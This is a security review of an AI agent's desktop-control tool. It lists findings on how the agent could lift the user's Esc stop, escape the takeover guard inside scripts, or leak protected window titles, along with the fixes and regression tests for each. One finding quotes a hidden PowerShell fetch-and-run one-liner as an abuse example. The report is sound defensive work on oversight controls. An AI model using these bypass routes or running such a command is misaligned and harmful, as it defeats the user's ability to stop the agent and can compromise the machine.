# Security re-check of v0.3.2 (HEAD 104cf34), 2026-11-09

Independent static re-check (Opus) of the v0.3.1 fixes. **Verdict: publish after fixes.** Fixed: H1, H2, H3, H5, H7, M1, M2, M4, M6. Partial: H4, H6, M3, M5, through the new items below. This file is the fix list for v0.3.3.

## Medium (all must be fixed)
- **N1. The Start-search fallback runs command lines (H6 bypass).**
  - Where: `apps.rs:335-344`. `classify` sends any text of 64 characters or less with no `\`, `/`, `://` or `scheme:` to Start search, so `open_app("powershell -nop -w hidden -c iwr x.y/z|iex")` minus the `/` gets typed into Start and Enter pressed.
  - Fix (director decision): **remove the typing fallback entirely.** When no installed app matches, return an error that lists the closest installed-app names and tells the model to ask the user. No Win key, no typing into Start.
- **N2. The agent can still lift the Esc stop.**
  - Where: `main.rs:44`, `session.rs:49-60`, `hooks.rs:97-129`, `guards.rs:13-15`. The agent's own shell can run `desktop-control.exe turn-ended` or touch the file, or simply wait 30 s, and `STOP_MESSAGE` tells it so.
  - Fix: the stop lifts only when (turn-ended touched after the stop **or** 30 s quiet) **and** a physical, non-injected user key or click has been seen after the stop (hook-flagged, `LLKHF_INJECTED`/`LLMHF_INJECTED` clear).
    - Ignore the Esc press and release that triggered the stop: require input at least ~300 ms after it, excluding that Esc's key-up.
    - Typing the next prompt in the AI app counts as user input.
    - Remove the 30 s and turn-ended hints from `STOP_MESSAGE` and `instructions.txt`. Say: "the user stopped you; call finish, explain, and wait for the user".
- **N3. `run_script` gets around the takeover guard.**
  - Where: `script.rs:275-290`, `tools.rs:267, 318`. Takeover refusals are catchable Rhai errors, and a `screenshot()` inside the script clears the takeover.
  - Fix:
    - Make the takeover terminal inside a script, ending the run the same way the stop does.
    - Only top-level `screenshot` / `list_elements` tool calls may clear a takeover; script-internal ones must not.
- **N4. The per-line clipboard restore can paste the user's own clipboard.**
  - Where: `input.rs` paste_lines, `actions.rs` settle. When the field can't be read, the restore comes about 250 ms after Ctrl+V, so a busy app may paste the user's clipboard.
  - Fix:
    - Restore per line only once the field visibly changed.
    - Otherwise wait until the target is idle (`SendMessageTimeout WM_NULL`, bounded) and restore once at the end.
    - Or type unreadable fields as keystrokes. Choose whichever is reliable, and test with a deliberately slow target.

## Low (fix in v0.3.3 as well)
- **L1. Masking fails open where acting fails closed.** `mask_protected` blacks out only LOCKED/FORBIDDEN exes. Also mask windows whose exe is unknown (`""`) and frame-host windows whose CoreWindow can't be found.
- **L2. Forbidden titles leak.**
  - Where: `check_exe` errors quote the title; `wait_for(scope=window)` returns raw titles (`actions.rs:274, 286`); the observe text includes "Active window now".
  - Fix: redact titles of FORBIDDEN/LOCKED windows everywhere in the output, and skip those windows in `match_window` for waits.
- **L3. The resolved path isn't re-checked.** Run `refusal()` and the `.exe` check on the canonical path (and on the target `find_app` resolves) before `ShellExecute`.
- **L4. Element process not checked.** In `resolve` and `locate_named`, run `check_exe` on the element's own process id, not only its root window.

## Publish-tree items
- `BUILD.md:9-12`: replace the personal paths with generic instructions (rustup default, or `RUSTUP_HOME`/`CARGO_HOME` as an example).
- README: use `desktop-control.exe` everywhere (MCP config, bench, Stop hook) until v1.0 renames it. Remove the `VERIFY` HTML comments after checking each claim against the code; drop or correct any claim that isn't true.
- `docs/SECURITY-REVIEW-0.3.1.md`: amend its status section to point to this file for H4/H6/M3/M5.
- The development history is not part of the published repository, which starts from a single commit; nothing to do in this round.

Runtime: after a simulated touch, a script with try/catch around a click, a screenshot and a second click ends as a takeover error with nothing after the refusal run and the button not clicked; a second script that starts with `screenshot()` or `list_elements()` still cannot click; a top-level `list_elements` tool call clears it.

## Status in v0.3.4

Each of the six limitations above is fixed in v0.3.4 (version bumped in `Cargo.toml` and `Cargo.lock`). Evidence classes as in v0.3.3: "runtime" = a test runs the real release exe against windows the test created itself; "debug build" = the same code run through test triggers that only exist in a debug build (`cfg(debug_assertions)`); "code-only" = reviewed and unit-tested but not exercised end to end. Regression tests are in `tests/security_test.py` (sections `n2` and `n2b` for the Esc go-ahead, `v34_open`, `v34_cancel`, `v34_idle`, `l2`, `l1l2d`, `v34_unknown`, `l4`) and the unit tests in `src/` (`hooks.rs`, `apps.rs`).

- **Esc go-ahead from any window (debug build + unit tests; the physical path is code-only).** A physical key press or click counts toward lifting the stop only when, at that moment, the foreground window (or its root owner) is one of the AI app's windows, a click also lies inside that window's rectangle, and a key is not a modifier or Windows key and is not pressed while Alt or a Windows key is down (see follow-up N1 below). The AI app's windows (the exact console or terminal window, the layer-3 fallback window of M6 when no AI app was found, and the visible windows of the host processes) are published to a lock-free cache (`hooks::set_host_windows`, 16 atomics) by `home::refresh_host_cache`, which runs at task start, when the fallback is set, and from the overlay's 100 ms poll at most once a second while a task runs or a stop holds. The hook callbacks only do `GetForegroundWindow`, `GetAncestor` and atomic loads: no lock, no window message, and only after the cheaper checks (a stop holds, a key press or button press, after the 300 ms grace period) have passed. On the turn-ended path the go-ahead must also be later than the turn-ended touch (`hooks::may_lift`: a key before the agent's own `turn-ended` does not count); the 30 s quiet path needs only a go-ahead after the stop. Unchanged: Esc never counts, key releases and mouse moves never count, injected input never counts. Runtime checks (debug build, sections `n2b` and `n2`): a key in the AI app before the agent's own `turn-ended` touch does not lift the stop; a key while another window is in front, after the touch, does not; a key in the AI app after the touch does; after 31 s of quiet a key in another app does not lift it and one in the AI app does. The debug trigger `DC_TEST_PHYSICAL_FILE` takes the handle of the window that counts as the foreground one for that key (an empty file means the real foreground window). Not exercised: a real physical key or click (a script cannot produce one), and the wiring from the hook callbacks to `physical_input` (read only, as in v0.3.3).
- **Very long `open_app` names (runtime, release exe; unit test).** `apps::classify` refuses a name over 260 characters (`MAX_NAME_CHARS`) before `refusal`, `find_app` or the closest-name search, with a message that does not echo the name. Test: names of 261, 5000 and 200000 characters are refused in under 10 ms; 260 characters is still looked at.
- **Idle wait ignores Esc and cancellation (runtime for the cancellation, debug build for the stop).** `wait_target_idle` returns `Idle::Aborted` as soon as `check_failsafe` fails (the stop, the screen-corner stop, or `mcp::cancelled`), checked between probes (every 20 to 60 ms), so it covers both the per-line wait and the final restore wait. The clipboard is then restored at once, the typing ends with the stop or cancellation, and the result carries the note that the clipboard was put back while the target may still have been about to paste. Test with a target that is busy for 12 s per Ctrl+V (`DC_SLOW_MS` in the dummy window): cancelled 2.5 s into the wait, the next call is answered at once (under 5 s; without the fix it waits for the target for several more seconds) and the clipboard is the user's again; stopped 2 s in, the typing ends right after the stop (2.8 s in all), the result is the stop with the clipboard note, and the clipboard is back.
- **Idle probe target (code-only).** The probe sends `WM_NULL` to the foreground window and, when `GetGUIThreadInfo(0).hwndFocus` belongs to another thread than the foreground window, to that window too (`idle_probe_windows`); idle means all of them answer promptly three times in a row. It needs a focused control on a different thread than its top-level window, which the test windows cannot produce, so only the single-thread path is exercised at runtime.
- **Title oracle (runtime, release exe; unknown program on the debug build).** `win::match_window` (used by `focus_window`, `move_window`, `screenshot(window=)`, `find_text(window=)`, the `open_app` fallback and, through the same function, waits) no longer considers windows for which `hides_title` is true (forbidden, locked and unidentifiable programs, and frame hosts without a CoreWindow), also when the window is named by `#id` or by its program name; `match_visible_window` is gone. A name that only a protected window matches gets the exact text of a name nothing matches (`No open window with "..." in its title.`, which only repeats the caller's own text). Test: a password-manager stand-in with a distinctive title, through `focus_window`, `move_window` and `screenshot`, by title, by `#id` and by program name, gets exactly the answer a nonexistent name gets (the v0.3.3 exe answers "refusing to control keepassxc.exe" there, so the test fails on it); an unidentifiable program's window (debug build) is neither focused, moved nor found by a wait, while an ordinary window is (controls). Existing tests that expected the old refusal text for a protected title (`security_test.py` H2/H3, `ocr_script_test.py` section 5) now expect "No open window"; acting on a protected window that is in front is still refused as before. Users will notice that a window of a program that can't be identified (for example an elevated one) can no longer be focused by title; it could not be driven before either.
- **Embedded protected child windows (runtime for protected programs, debug build for unknown programs; the focus path is code-only).** `mask_protected` (monitor screenshots and the OCR that reads them) and the new `mask_embedded` (window screenshots) black out the rectangle of every visible child window whose process is protected or unidentifiable and differs from its top-level window's process (Store-app frame hosts are left to the CoreWindow rule). The walk is bounded (400 children per top-level window, 3000 per picture). UI Automation crawls (`list_elements`, the text snapshots and named lookups) skip the subtree of an element whose own process is protected (the process id is cached with the other properties, one lookup per process id per crawl); the wait lookup (`find_text`) ignores such a hit; the focused control is not read (`read_text` without a target, the focus line, the typed-text check) when it sits in such a process. Test: a password-manager stand-in and an ordinary program's window embedded as child windows of one ordinary window (`SetParent`). UI Automation lists the ordinary one's button (control) but not the stand-in's; the stand-in's text is read by OCR in neither the window picture nor the monitor picture while the ordinary one's text is (the v0.3.3 exe shows it in both, so the test fails on it); `element_action`, `read_text(name)` and `set_value` on its button find no element, a wait does not find it, and the button is not invoked. With a debug-only unidentifiable process the embedded window is blacked out of window and monitor pictures. Not exercised: a focused control inside such a window (the test cannot give focus across processes), and the Store-app frame branch.

Follow-ups from the independent review of the first v0.3.4 commit (all fixed in v0.3.4 before release):
- **N1 (blocking): a click into another app, or Alt+Tab or Win, counted as the go-ahead (debug build + unit tests).** A click is judged at button-down, when the foreground window is still the one being left (and `finish` brings the AI app to the front during a stop). Now a click counts only if its point (`MSLLHOOKSTRUCT.pt`) lies inside `GetWindowRect` of the foreground window or its root, which must be one of the AI app's cached windows. A key counts only if it is not a modifier or Windows key (VK 0x10 to 0x12, 0x5B, 0x5C, 0xA0 to 0xA5) and neither Alt nor a Windows key is held (`GetAsyncKeyState`: lock-free, no message). Tests (debug trigger text `<hwnd> vk=<n> | click=<x>,<y> | mods=1`): a click outside the host rectangle while the host is in front, Alt, Alt+Tab, the Windows key, Win+R, Shift and Ctrl do not lift the stop; a plain key and a click inside the host do. Unit tests cover the modifier set and the rectangle test.
- **N2 (blocking): possible deadlock between `touch()` and the overlay thread (code-only, audit).** `home::refresh_host_cache` ran under the task lock and, through `is_candidate`, queried the title of our own overlay windows, which is a message to the overlay thread, which may wait for the task lock. Now `is_candidate`, `win::is_work_window` and the refresh skip our own process before any title query, and `touch()` refreshes the cache after releasing the task lock; `set_fallback` no longer refreshes (its callers run under or before that lock). Audit of the other task-lock holders (`touch`, `end`, `end_locked`, `poll_end`, `activity`, `note_target`): none queries a title or sends a window message any more (`start_home` under the lock, in the rare restart race, goes through the same own-process skip).
- **N3: the host cache dropped to empty when the AI app's window was hidden (unit tests).** A refresh that finds no window keeps the last non-empty cache while the AI app is known (`hooks::cache_action`); with nothing cached it stays closed. It fails open only when no AI app was identified and there is no fallback window, a separate flag (`HOST_FAIL_OPEN`).
- **N4: an unreadable program counted as unprotected for UI Automation (code-only).** `in_protected_process` now treats an empty or unreadable executable name as protected, like masking does.
- **N5: a protected window's title could mark an installed app as running (runtime, release exe).** `list_apps` only collects the title of a window that is not hidden. Test: a password-manager stand-in titled "DC Calculator Vault ..." does not make the installed Calculator "running"; an ordinary window with such a title does.
- **N6: the child-window walk failed open at its limit (debug build).** When the walk of a window hits the limit (400 children, 3000 per picture; a debug build can lower it with `DC_TEST_CHILD_LIMIT`), or the total is used up and the window has children, the whole top-level window is blacked out of monitor and window pictures and of the OCR that reads them. Test: with a limit of one child the host window's text is not read in either picture; with the default limit it is.

Residual after v0.3.4:
- With no AI app window known at all (nothing found and no fallback window), nothing can tell the AI app's window from any other, so any key or click counts as before; otherwise the stop would never lift. A known AI app whose windows are all hidden for a moment never fails open: the last cached windows are kept.
- A click counts by its position in the window in front, so a click on a window of another app that overlaps the AI app's rectangle (while the AI app is in front) counts; the next real use of the AI app is what the rule is after, and this needs another app drawn over the AI app.
- The Esc go-ahead cache refreshes about once a second: an AI app window opened in the last second is not yet in it (the next key press there after that counts). A click that switches to the AI app (it is not in front yet) does not count; the next key typed there does.
- Masking uses the process of a child window, not its content: a protected program that draws into a window owned by an ordinary process (no window of its own) is not recognised, as before.
- A window of an unreadable program can no longer be focused or moved by title at all (it was already refused for every action).
- The idle probe covers the foreground window and the focused control's window only, not a helper process that pastes from a timer after it has gone idle (unchanged from v0.3.3).
